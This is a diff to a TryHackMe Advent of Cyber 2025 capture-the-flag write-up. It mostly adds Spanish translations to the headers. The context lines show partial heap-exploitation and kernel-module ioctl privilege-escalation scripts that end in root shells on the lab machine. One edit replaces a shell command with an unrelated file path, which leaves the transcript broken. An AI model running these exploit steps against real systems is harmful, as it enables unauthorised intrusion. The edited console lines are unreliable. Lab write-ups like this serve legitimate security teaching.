@@ -5,7 +5,7 @@ Tutorial from jaxafed TryHackMe: AoC 2025 Side Quest TWO
 
 ---
 
-### `tags:`
+`tags:`
 
 | Categoría | Tecnologías y Técnicas |
 | --- | --- |
@@ -31,7 +31,7 @@ Lastly, I will also share how instead of exploiting the kernel module we could h
 [![Tryhackme Room Link](./img/room_card.webp)
  (https://tryhackme.com/room/sq2-aoc2025-JxiOKUSD9R) 
 
-## Finding the Key
+## Encontrando la Llave / Finding the Key
 
 On the machine attached to the [Advent of Cyber Day 9 room](https://tryhackme.com/room/attacks-on-ecrypted-files-aoc2025-asdfghj123), apart from the files relevant to the questions in the room, we can also find the `.Passwords.kdbx` KeePass database in the `ubuntu` user's home directory.
 
@@ -85,13 +85,13 @@ Opening it, we find the key and can continue to the side quest.
 
 ![Key Image](./img/key_image.webp) 
 
-## Side Quest
+## Misión Lateral / Side Quest
 
 As usual, we start the side quest by visiting the web server on port `21337` and entering the key we discovered to remove the firewall.
 
 ![Web 21337 Unlock](./img/web_21337_unlock.webp) 
 
-### Initial Enumeration
+### Enumeración Inicial / Initial Enumeration
 
 Afterwards, we run an `nmap` scan to discover all the services running on the target.
 
@@ -136,7 +136,7 @@ Version 4.2.0
 >>
 ```
 
-### First Flag
+### Primera Bandera / First Flag
 
 There does not seem to be anything on the web application at port `80`. However, fuzzing it for directories, we can quickly discover the **`/dev`** endpoint.
 
@@ -175,7 +175,7 @@ Command executed
 Failed to execute the command
 ```
 
-### Second Flag
+### Segunda Bandera / Second Flag
 
 Apart from the flag in the `strings` output, we see a couple more interesting things: the template for an HTTP request, a menu, and what looks like a key: `EastMass`.
 
@@ -274,7 +274,7 @@ $ curl -s http://10.66.175.175/7ln6Z1X9EF/foothold.txt | head -c 4
 THM{
 ```
 
-### Third Flag
+### Tercera Bandera / Third Flag
 
 Apart from the flag, we also have the `4.2.0-R1-1337-server.zip` archive. Downloading and extracting it, we get a binary along with the `libc` it uses.
 
@@ -312,8 +312,7 @@ Usually, in heap exploitation challenges, we would also have a read primitive al
 
 For the actual exploit, we can simply modify the [PoC](https://github.com/corgeman/leakless_research/blob/main/part_1/fsop_solve.py) shared by the article’s author. There is one caveat, however: the PoC includes functionality to leak two ASLR-affected nibbles, which we do not have. We therefore need to modify the script to brute-force these bytes instead, like so:
 
-
-###  file="solve.py"
+file="solve.py"
 ```py
 #!/usr/bin/env python3
 
@@ -387,7 +386,6 @@ for heap_brute in range(16):
 			delete(fake_size_lsb)
 			delete(fake_size_msb)
 
-
 			update(playground,p64(0x31),0x4e8)
 			delete(start_M)
 			update(start_M,p64(0x91),8)
@@ -438,7 +436,6 @@ for heap_brute in range(16):
 			continue
 ```
 
-
 For the RCE portion of the exploit, we also need the [`io_file.py`](https://github.com/corgeman/leakless_research/blob/main/part_1/io_file.py) file from the same repository.
 
 Now, with everything in place, we can run the exploit and see that we successfully obtain a shell inside a Docker container and can read the third flag inside `user.txt`.
@@ -469,7 +466,7 @@ $ wc -c user.txt
 > I would highly recommend running the exploit from the **AttackBox**, as it will be extremely faster due to both machines being on the same network. Also, the exploit might require running it multiple times until you get the correct values.
  
 
-### Fourth Flag
+### Cuarta Bandera / Fourth Flag
 
 Apart from the flag, we also have an SSH key pair with the `agent` username shown in the public key comment.
 
@@ -676,14 +673,14 @@ Lastly, calling `ioctl` with the correct operation code to run `ctx.current_op` 
 >>> ioctl(fd, IOCTL_EXEC_OP)
 0
 >>> pty.spawn("/bin/sh")
-# id
+# Advent 2025\SideQuest\Sidequest\Sidequest2\Tutorial\tutorial_Jaxafed [N/A]
 uid=0(root) gid=0(root) groups=0(root)
-# wc -c /root/root.txt
+## wc -c /root/root.txt
 29 /root/root.txt
 ```
 
 If you want a script to perform this automatically instead of step-by-step, the script below can be run to get a root shell.
-###  file="solve.py"  
+file="solve.py"
 
 ```py
 from fcntl import ioctl
@@ -715,10 +712,9 @@ ioctl(fd, IOCTL_EXEC_OP)
 pty.spawn("/bin/sh")
 ```
 
-
 ```console
 agent@tryhackme:~$ python3 solve.py
-# id
+## id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
@@ -734,6 +730,4 @@ bin.usr-is-merged  core  etc  lib   lib32              libx32  media       opt  
 root@bb21200fff81:/home/srv# wc -c /mnt/root/root.txt
 29 /mnt/root/root.txt
 ```
-
-
 
